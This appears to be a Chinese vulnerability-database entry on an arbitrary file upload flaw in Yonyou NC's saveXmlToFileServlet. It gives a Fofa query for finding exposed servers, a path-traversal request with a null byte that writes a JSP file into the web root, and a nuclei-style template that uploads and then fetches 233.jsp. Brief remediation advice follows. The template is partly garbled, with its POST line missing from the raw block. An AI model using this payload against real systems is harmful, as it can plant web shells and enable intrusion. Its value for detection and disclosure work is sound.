# 用友NCsaveXmlToFileServlet文件上传

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="YONYOU NC"`
- **请求**：`POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{filename}}%00 HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title="YONYOU NC"
2、部分界面如下
3、隐患url,复现如下
id: yongyou-nc-savexmltofileservlet-fileupload
info:
name: yongyou-nc-savexmltofileservlet-fileupload
author: unknow
severity: high
description: 用友 NC saveXmlToFileServlet 存在文件上传漏洞。
tags: yongyou,fileupload
metadata:
fofa-qeury: title="YONYOU NC"
http:
- raw:
-
Host:
Content-Type: application/octet-stream
233333333333
-
GET /{{filename}} HTTP/1.1
Host:
payloads:
filename:
- "233.jsp"
matchers:
- type: dsl
name: fileupload
dsl:
- '(status_code==200 )  && contains(body, "233333333333") && contains(header, "text/html")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。